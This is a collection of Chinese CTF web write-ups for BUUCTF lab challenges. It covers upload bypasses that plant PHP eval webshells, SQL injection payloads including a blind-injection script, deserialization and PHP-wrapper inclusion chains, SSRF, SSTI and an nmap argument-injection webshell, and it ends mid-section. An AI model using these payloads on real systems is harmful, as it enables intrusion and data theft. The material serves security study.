如果要伪造session需要知道SECRET_KEY，这个我们可以再项目源码中找到，再config.py中

```python
import os
class Config(object):
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'
    SQLALCHEMY_TRACK_MODIFICATIONS = True
```

利用flask_session加密脚本进行伪造，伪造的session：

```
.eJxNkEFrwkAUhP9KeWcPNdGL4KGyMUR4Lygxy76LpBqTvGQtREWz4n_vVkrpYU7DDN_MA3bHvjzXMLv013IEu-YAswe8fcIMyEUDCt7R4UCydShUG72xaYx341aSqn1AmmvjFpYz7owkjhU1bNGx5EIuGaP6yS07lGTg2EuqMM0WLer1lLS5kVpZik1IGQur7YAqmZCrQlTVxAQ4MXob-HzrORxqfE-z6o6WhdSh5pg6kr0jFc3hOYL9uT_uLl9tefo3IW89-thI5FHxxpJM2eYNqmXrJ9SkoyllSUg6b1K16Sj7CHg9f9U1tqjKv6YspML8OqfCegOKg21OMILruexfv8EYnt-QEm3c.Xwkyxg.m6cjsP-TbdXQ8gv9HanF8pE_oGU
```

然后登录时候修改session，即可显示flag

### [MRCTF2020]你传你🐎呢

.htaccess文件(或者"分布式配置文件"）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。新建.htaccess文件，编辑内容为SetHandler application/x-httpd-php //该语句作用是让Apache将其他类型文件均以php格式解析

hack.phtml

```php+HTML
GIF89a
<script language="php">eval($_POST['shell']);</script>
```

BurpSuite上传时拦截改文件头为image:jpeg，发现传不上去。
php和phtml等不能传，发现可以传jpg，也可以传.htaccess文件。
思路就比较清晰了，传.htaccess文件，然后再传一张jpg图片马，就会被解析为php。
上传`.htaccess`文件，其内容如下(下面俩都可以使用)

```htaccess
AddType application/x-httpd-php jpg
```

```htaccess
<FileMatch "hack.jpg">
SetHandler application/x-hhtpd-php
</FileMatch>
```

Burp拦截修改文件头为`image/jpeg`，Forward后上传成功，并且返回了：
`/var/www/html/upload/baff504dcb150f4fe76d1839d2a8c563/.htaccess succesfully uploaded!`
将刚才的hack.phtml文件后缀名该为jpg，然后不需要改头直接上传，返回：
`**Warning**: mkdir(): File exists in **/var/www/html/upload.php** on line **23**
/var/www/html/upload/baff504dcb150f4fe76d1839d2a8c563/hack.jpg succesfully uploaded!`
直接上蚁剑或者菜刀开干，路径为`网址/upload/baff504dcb150f4fe76d1839d2a8c563/hack.jpg`

### [ZJCTF 2019]NiZhuanSiWei

php协议流：

data:// 数据流

> 这个data流可以直接传入代码被解析执行，类似php://input 输入流
> data: text/plain,输入数据
> data: text/plain;base64,输入数据(base64加密)

php://filter 编码流
>查看php文件源代码，而不是被解析。
>原理是通过php编码流base64编码使得解析器无法解析。
>php://filter/read=convert.base64-encode/resource=php文件

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    #在 file_get_contents() 函数中传递文件名参数 $text （也可以是URL），第二个参数 'r' 表示以只读方式打开文件，在读取结束前不能写入或者截取此文件。如果出现错误，此函数将返回 false
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){ #此处会被正则过滤flag字样所以file不能写flag
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

```
所以第一个if条件绕过可以构造
?text=data://text/plain,welcome to the zjctf
```

```
接下来加入 file，一下两种都可以
?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php
```

```
?text=data://data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php
```

```base64
读取到useless.php
PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
```

```php
#base64解码后得到源码 
<?php  
    class Flag{  //flag.php  
        public $file;  
        public function __tostring(){  
            if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
            return ("U R SO CLOSE !///COME ON PLZ");
            }  
        }  
    }  
?>
```

```php
#将$file赋值flag.php 反序列化一下
<?php 
class Flag{  //flag.php 
    public $file="flag.php"; 
    public function __tostring(){ 
        if(isset($this->file)){ 
            echo file_get_contents($this->file);
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        } 
    } 
} 
$password=new Flag();
echo serialize($password);
?> 
#O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

```
?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}
```

```
注意此时已经不需要再读取useless.php的base64加密源码了，file直接等于useless.php
?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}
```

查看源码直接拿下flag:`flag{6af781f6-59dd-4a60-aaff-afc80f5be507}`

### [极客大挑战 2019]HardSQL

万能和双写都不行，可以使用`extractvalue()`和`updatexml()`进行报错注入，`空格`和`=`没有，所以使用`()`来代替`空格`，使用`like`来代替`=`号

```sql
1'^extractvalue(1,2)# 没有报错 测出该表为两个字段
#使用extractvalue() MySQL的ExtractValue()函数用于从XML文档中提取符合特定XPath表达式的节点或者元素的值。
1'^extractvalue(1,concat(0x7e,(select(database()))))#
#Error!	XPATH syntax error: '~geek' 直接把数据库名爆出来了
1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))#
#Error!	XPATH syntax error: '~H4rDsq1'报出表名
1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))#
#Error!	XPATH syntax error: '~id,username,password'
1'^extractvalue(1,concat(0x7e,(select(username)from(geek.H4rDsq1))))#
#Error!	XPATH syntax error: '~flag'
1'^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))#
#Error!	XPATH syntax error: '~flag{18af3ff7-f3cf-4efb-b5f7-94' 只有一半
1'^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))#
#Error!	XPATH syntax error: '~7-f3cf-4efb-b5f7-9432314ba0cb}'
flag{18af3ff7-f3cf-4efb-b5f7-9432314ba0cb} #对照拼凑一下
```

### [MRCTF2020]Ez_bypass

开门见山就是源码，开审

```php
#I put something in F12 for you include 'flag.php'; 
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; 
if(isset($_GET['gg'])&&isset($_GET['id'])) { 
    $id=$_GET['id']; $gg=$_GET['gg']; 
    if (md5($id) === md5($gg) && $id !== $gg) { #md5强碰撞用数组绕过即可 gg[]=1&id[]=2
        echo 'You got the first step'; 
        if(isset($_POST['passwd'])) { 
            $passwd=$_POST['passwd']; 
            if (!is_numeric($passwd)) { #不能是数字 
                if($passwd==1234567) { #弱等于1234567 直接1234567a
                    echo 'Good Job!'; 
                    highlight_file('flag.php'); 
                    die('By Retr_0'); } 
                else { 
                    echo "can you think twice??"; 
                } 
            } 
            else{ 
                echo 'You can not get it !'; 
            } 
        } 
        else{ 
            die('only one way to get the flag'); 
        } 
    } 
    else { 
        echo "You are not a real hacker!"; 
    } 
} 
else{ 
    die('Please input first'); 
} 
#Please input first
```

![image-20230323144122180](F:\Info\Information\Typora\Web-CTF\[MRCTF2020]Ez_bypass.png)

### [SUCTF 2019]CheckIn

https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn
Burp抓包改文件名后缀为`hack.phtml.`时发现多写一个`.`可以进行绕过
制作`.user.ini`文件并上传

```
GIF89a
auto_prepend_file=upload.gif
```

上传upload.gif

```
GIF89a
<script language="php">eval($_POST['shell'])</script>
```

Your dir uploads/c47b21fcf8f0bc8b3920541abd8024fd
Your files :
array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".user.ini" [3]=> string(8) "upload.gif" [4]=> string(9) "index.php" }

```sql
#根据返回的路径构成下面的链接进入index.php，返回了信息：GIF89a 说明OK了
http://64ae2503-2466-4b16-8a11-b18001fa858d.node4.buuoj.cn:81/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php #密码shell 直接开连
```

### [网鼎杯 2020 青龙组]AreUSerialz

```php
<?php

include("flag.php"); #flag

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") { #op==2才能读取文件
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) { #获取str

    $str = (string)$_GET['str'];
    if(is_valid($str)) { #检测变量是否被实例化，如实例化就返回True，没有返回False
        $obj = unserialize($str); #反序列化了 所以先序列化
    }

}
```

```php
<?php
    class FileHandler {
        public $op=2;
        public $filename="flag.php";
        public $content;
    }
$a = new FileHandler;
print_r(serialize($a));
?>
#?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
#记得查看注释，通过注释拿到flag
```

### [GXYCTF2019]BabySQli

https://github.com/imaginiso/GXY_CTF/tree/master/Web/BabySqli 源码
万能密码或者随便输入点什么来到回显界面，右键查看源码发现注释中藏着一条密文：`MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5`

```python
#先用base32解码
import base32
des = input("Please input:")
src = base32.b32decode(des)
print(src)
#得到c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==
```

```python
#再用base64解码
import base64
des = input("Please input:")
src = base64.b64decode(des)
print(src)
#得到select * from user where username = '$name'
```

使用`name=1' union select 1,'admin',3 #`&`pw=随便写`测试回显：`wrong pass!`，发现`admin`在第二个参数位置是不会报错的，即第二参数为`username`字段
从链接中查看源码寻找新思路：

```php
<?php$row;
$pass=$_POST['pw'];
if($row['username']==’admin’){ #username必须是admin 弱等于
if($row['password']==md5($pass)){ #md5加密弱等于 可以用数组也可以碰撞
echo $flag; 
}else{ echo “wrong pass!”; 
}}
else{ echo “wrong user!”;}
```

```bash
1' union select 1,'admin',NULL #
pw[]=123 #此处Burp改包实现
name=1%27+union+select+1%2C%27admin%27%2CNULL+%23&pw[]=123
name=1' union select 1,'admin',NULL#		pw[]=123
#账户输入该payload，密码随便，Burp抓包改包Forward后拿下flag
```

或者使用碰撞，`md5(1)='c4ca4238a0b923820dcc509a6f75849b'`，即密码输入`1`，其md5值作为第三参数进行注入。

```bash
账号：-1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#
密码：1
```

### [GXYCTF2019]BabyUpload

https://github.com/imaginiso/GXY_CTF/tree/master/Web/babyupload
传php发现不太行，但发现是Apache服务器，可以使用`.htaccess`

```php+HTML
GIF89a
<script language="php">eval($_POST['shell'])</script> #xx.jpg 整一个木马图片 成功了访问图片是可以看见GIF89a的 
```

```php
AddType application/x-httpd-php jpg
```

BurpSuit抓包改包：`Content-Type: image/jpeg`
上传文件后网站给出了文件所在路径：`/var/www/html/upload/608f8703baea92a564ecb2f7017d08d6/hack.jpg succesfully uploaded!`

### [GYCTF2020]Blacklist

```sql
1';show databases;# 查出了一堆数据库
1';select databases();# 发现有过滤 return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
1';seselectlect databases();#双写也不行 被gank了
1';show tables;# 查表看见FlagHere
1';show columns from FlagHere;# 在该表中看见flag字段
1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#
```

### [CISCN2019 华北赛区 Day2 Web1]Hack World

[异或注入 - 简书 (jianshu.com)](https://www.jianshu.com/p/27df5c67157c)
[[CISCN2019 华北赛区 Day2 Web1\]Hack World WriteUp - 简书 (jianshu.com)](https://www.jianshu.com/p/b7a03e98357e)

```python
import requests
import time

url = "http://f9eea92f-b62c-406a-98bf-333add9778bc.node4.buuoj.cn/index.php"
payload = {
    "id" : ""
}
result = ""
for i in range(1,100):
    l = 33
    r =130
    mid = (l+r)>>1
    while(l<r):
        payload["id"] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
        html = requests.post(url,data=payload)
        print(payload)
        if "Hello" in html.text:
            l = mid+1
        else:
            r = mid
        mid = (l+r)>>1
    if(chr(mid)==" "):
        break
    result = result + chr(mid)
    print(result)
print("flag: " ,result)
```

### [网鼎杯 2018]Fakebook

注册一个账号点击进入发现 url：`http://7d31874e-fc05-497a-9bca-dac17a121ead.node4.buuoj.cn:81/view.php?no=1`，直接注入

```mariadb
1 and updatexml(1,concat(%27~%27,database(),%27~%27),1)
#得到fakebook
#获取表名：
1 and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),1)
#得到users
#获取列名：
1 and updatexml(1,concat(%27~%27,(select group_concat(column_name) from information_schema.columns where table_name=%27users%27),%27~%27),1)
#得到no,username,passwd,data
#查询数据data：
1 and updatexml(1,concat(%27~%27,(select group_concat(data) from fakebook.users)),1)
#发现data是序列化数据，但是发现不全，利用union查询，payload如下：
-1 union/**/select 1,group_concat(data),3,4 from fakebook.users #-1查不到任何数据后Union返回显示内容
#得到O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:9:"w0s1np.cn";}
```

```bash
./dirsearch.py -u http://7d31874e-fc05-497a-9bca-dac17a121ead.node4.buuoj.cn:81/ -e php
```

扫描发现了`robots.txt`文件，进入查看得到如下内容

```
User-agent: *
Disallow: /user.php.bak
```

```
http://7d31874e-fc05-497a-9bca-dac17a121ead.node4.buuoj.cn:81/user.php.bak
```

```php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

blog处出现ssrf漏洞，可以通过`file`协议读取flag文件，构造序列化：
`O:8:"UserInfo":3:{s:4:"name";s:1:"a";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}`
因为blog在第四列，所以构造payload:

```
?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"a";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

当blog处得到` file:///var/www/html/flag.php`即可，查看源代码，base64解密即可

```html

<!doctype html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>User</title>

    <link rel="stylesheet" href="css/bootstrap.min.css" crossorigin="anonymous">
<script src="js/jquery-3.3.1.slim.min.js" crossorigin="anonymous"></script>
<script src="js/popper.min.js" crossorigin="anonymous"></script>
<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
</head>
<body>
<div class="container">
    <table class="table">
        <tr>
            <th>
                username
            </th>
            <th>
                age
            </th>
            <th>
                blog
            </th>
        </tr>
        <tr>
            <td>
                2            </td>
            <td>
                0            </td>
            <td>
                file:///var/www/html/flag.php            </td>
        </tr>
    </table>

    <hr>
    <br><br><br><br><br>
    <p>the contents of his/her blog</p>
    <hr>
    <iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3szY2ZlOTljNy03ZGU1LTQzNWQtOGFjNC02M2VhZGRjM2QyNzR9IjsNCmV4aXQoMCk7DQo='> <!--这里-->
</div>
</body>
</html>
```

```cmd
python
Python 3.10.6 (tags/v3.10.6:9c7b4bd, Aug  1 2022, 21:53:49) [MSC v.1932 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> src = "PD9waHANCg0KJGZsYWcgPSAiZmxhZ3szY2ZlOTljNy03ZGU1LTQzNWQtOGFjNC02M2VhZGRjM2QyNzR9IjsNCmV4aXQoMCk7DQo="
>>> des = base64.b64decode(src)
>>> print(des)
b'<?php\r\n\r\n$flag = "flag{3cfe99c7-7de5-435d-8ac4-63eaddc3d274}";\r\nexit(0);\r\n'
```

### [RoarCTF 2019]Easy Java

万能密码无法成功，点击help到了这个页面`http://36097577-fb9c-40e5-b6ce-1f73ac1d5f96.node4.buuoj.cn:81/Download?filename=help.docx`
对于这种url，可以往文件包含方向考虑。对于这种url，可以往文件包含方向考虑。
直接burp中改get为post。得到一些乱码，根据其中的一些字符考虑为WEB-INF/web.xml文件泄露。
漏洞发生原因：

```
Tomcat的WEB-INF目录，每个j2ee的web应用部署文件默认包含这个目录。
Nginx在映射静态文件时，把WEB-INF目录映射进去，而又没有做Nginx的相关安全配置（或Nginx自身一些缺陷影响）。
从而导致通过Nginx访问到Tomcat的WEB-INF目录（请注意这里，是通过Nginx，而不是Tomcat访问到的，因为上面已经说到，Tomcat是禁止
```

```
WEB-INF主要包含一下文件或目录：
/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
/WEB-INF/database.properties：数据库配置文件
```

`BurpSuite`改help链接为POST发现可以直接下载文件，于是直接POST读取 WEB-INF/web.xml 

```
http://5c5df00b-118f-45b5-8d77-690092027e98.node4.buuoj.cn:81/Download?filename=WEB-INF/web.xml
```

```xml
 cat .\WEB-INF_web.xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <welcome-file-list>
        <welcome-file>Index</welcome-file>
    </welcome-file-list>

    <servlet>
        <servlet-name>IndexController</servlet-name>
        <servlet-class>com.wm.ctf.IndexController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>IndexController</servlet-name>
        <url-pattern>/Index</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>LoginController</servlet-name>
        <servlet-class>com.wm.ctf.LoginController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>LoginController</servlet-name>
        <url-pattern>/Login</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>DownloadController</servlet-name>
        <servlet-class>com.wm.ctf.DownloadController</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>DownloadController</servlet-name>
        <url-pattern>/Download</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class> <!--此处为flag文件路径-->
    </servlet>
    <servlet-mapping>
        <servlet-name>FlagController</servlet-name>
        <url-pattern>/Flag</url-pattern>
    </servlet-mapping>

</web-app>
```

根据web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码

```
filename=/WEB-INF/classes/com/wm/ctf/FlagController.class
```

```cmd
 javap -c .\WEB-INF_classes_com_wm_ctf_FlagController.class
Compiled from "FlagController.java"
public class FlagController extends javax.servlet.http.HttpServlet {
  java.lang.String flag;

  public FlagController();
    Code:
       0: aload_0
       1: invokespecial #1                  // Method javax/servlet/http/HttpServlet."<init>":()V
       4: aload_0						  # ====================↓ 我是flag ↓====================
       5: ldc           #2                  // String ZmxhZ3s4NjRmZDQyMS1jZDhhLTRkYWItYjZiNS1mZjU1YjYxMDEyNjN9Cg==
       7: putfield      #3                  // Field flag:Ljava/lang/String;
      10: return

  protected void doGet(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) throws javax.servlet.ServletException, java.io.IOException;
    Code:
       0: aload_2
       1: invokeinterface #4,  1            // InterfaceMethod javax/servlet/http/HttpServletResponse.getWriter:()Ljava/io/PrintWriter;
       6: astore_3
       7: aload_3
       8: ldc           #5                  // String <h1>Flag is nearby ~ Come on! ! !</h1>
      10: invokevirtual #6                  // Method java/io/PrintWriter.print:(Ljava/lang/String;)V
      13: return
}
```

```cmd
python
Python 3.10.6 (tags/v3.10.6:9c7b4bd, Aug  1 2022, 21:53:49) [MSC v.1932 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> src = "ZmxhZ3s4NjRmZDQyMS1jZDhhLTRkYWItYjZiNS1mZjU1YjYxMDEyNjN9Cg=="
>>> des = base64.b64decode(src)
>>> print(des)
b'flag{864fd421-cd8a-4dab-b6b5-ff55b6101263}\n'
```

### [BJDCTF2020]The mystery of ip

因为flag界面直接将127.0.0.1输出到页面，可以猜测是ssti模板注入
使用burpsuite抓取Flag页面的包，尝试添加X-Forwarded-For头，并赋值127.0.0.1，ip地址发生变化
X-Forwarded-For:{{system("cat /flag")}}

### [网鼎杯 2020 朱雀组]phpweb

打开网页观察网页显示动态，发现网页每隔一段时间会刷新一下，说明可能自动间隔一段时间刷新一次，观察网页，网页上会显示一段warning信息，并提示了data()函数
利用BurpSuite拦截网页，看一下有什么异常。观察发现网页会传递两个参数，func和p。func对应的值为date，p对应的值为一串时间格式，说明网页可能向后端传递函数名及其对应的参数
php date(format)：格式化日期和时间，并返回格式化的日期字符串
根据上面的分析，可以自行修改func和p的值，看是否能获取一些其他信息。首先尝试eval()函数，参数为<?php phpinfo();?>(这里使用burp的Repeater功能，便于修改参数，查看返回结果)。返回结果如下，显示hacker，说明后端可能对该函数进行过滤。

![image-20230501103722117](.\Web-CTF\[网鼎杯 2020 朱雀组]phpweb.png)

修改参数，利用file_get_contents获取index.php的源码，如下：

```php
file_get_contents(path)#:读取path路径下文件的内容。
```

func=file_get_contents&p=index.php，然后查看源码得到index.php

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

call\_user\_func(函数名，参数)：调用传递函数，并返回函数运行的结果（本例中即为执行$func($p)）
gettype:获取参数类型
这段源码的运行逻辑为，利用$_REQUEST["func"]和$REQUEST["p"]获取对应参数值，将这些参数值传入gettime。gettime的逻辑即是利用call_user_func执行传入的函数，并将执行结果返回在网页上显示。
这段源码中，class Test比较有意思，但并没有被调用。可以作为一个线索。可以考虑自己创建一个类，利用$func和$p执行命令，获取一些文件信息。
此时可以设$func=unserialize,$p=初始化类语句的序列化结果。

```php
<?php
    class Test {
        var $p = "ls /";
        var $func = "system";
    }
    $o = new Test;
    echo urlencode(serialize($o));
//O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A4%3A%22ls+%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D
```

此时传入的参数为func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}

后端接收这两个参数后，调用call_user_func将上面的字符串进行反序列化，还原成上面的代码。而上面的代码核心在于创建一个Test()对象，因为在_destruct()函数是构造方法，在创建对象时会执行，根据在Test类中设置的函数名和参数值再一次执行，此时即可获取我们所需的信息。

常用命令小结：

system('ls') : 列举当前目录下的所有文件
system("find / -name flag\*\")：查找所有文件名匹配flag\*的文件
system("cat $(find / -name flag)")：打印所有文件名匹配flag\*的文件

```php
<?php
class Test {
    var $p = "cat $(find / -name flag*)";
    var $func = "system";
}
$o = new Test;
echo urlencode(serialize($o));
```

BurpSuite发送后查看源码即可

### [BUUCTF 2018] Online Tool

[菜刀连接webshell - 桃花雪 - 博客园 (cnblogs.com)](https://www.cnblogs.com/l1pe1/p/9212676.html)
https://codeload.github.com/raddyfiy/caidao-official-version/zip/refs/heads/master 菜刀下载链接
[中国蚁剑（AntSword）安装、使用教程 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/537053564)
https://codeload.github.com/AntSwordProject/AntSword-Loader/zip/refs/heads/4.0.3 蚁剑下载链接

构造payload使得它可以再完成部分的检测后最后执行最后一句的nmap命令，nmap的一个参数-oG可以实现将命令和结果写到文件，利用-oG参数往网站里写一行一句话木马，关键在于怎么构造payload来绕过escapeshellarg($host)和 escapeshellcmd($host)这两个函数

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    #escapeshellarg() 函数将转义参数字符串并添加引号，以便安全地传递给 shell。它确保字符串被正确地解释，不会导致 shell 注入和命令行注入等漏洞
    $host = escapeshellcmd($host);
    #escapeshellcmd() 函数将转义或删除可能存在于命令的特殊字符，也可以防止命令注入漏洞
    #反斜线(\)会在以下字符之前插入：&#;`|*?~<>^()[]{}$\,\x0A和\xFF。'和"仅在不配对儿的时候被转义 Windows上这些字符以及%和!字符都会被空格代替
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

```php
?host=' <?php @eval($_POST["cmd"]);?> -oG hack.php '
```

```bash
nmap -T5 -sT -Pn --host-timeout 2 -F / <?php eval($_POST["cmd"]);?> -oG shell.php #对端机器执行为该指令
```

在网站url后写入payload之后会得到类似回显：you are in sandbox `fc31a305d240da8125ab13e40b03eb0b`Starting Nmap 7.70 ( https://nmap.org ) at 2023-03-21 10:38 UTC Nmap done: 0 IP addresses (0 hosts up) scanned in 0.62 seconds Nmap done: 0 IP addresses (0 hosts up) scanned in 0.62 seconds
网站会告诉你文件放在了哪个沙盒环境中，即到了哪个路径中去了。
之后用蚁剑或者菜刀连接沙盒目录下生成的后门php木马文件：`http://c9984789-4867-4664-9a16-634cef7ca147.node4.buuoj.cn:81/沙盒路径/后门php文件名`
打开虚拟终端直接去根目录就可以找到flag，注：蚁剑菜刀首页空白处右键添加即可弹出连接信息设置。

### [BJDCTF2020]ZJCTF，不过如此

[[BJDCTF2020\]ZJCTF，不过如此 - 码农教程 (manongjc.com)](http://www.manongjc.com/detail/26-yarksepgeejpyce.html)

```
?text=data://text/plain,I have a dream&file=php://filter/convert.base64-encode/resource=next.php
```

```cmd
python
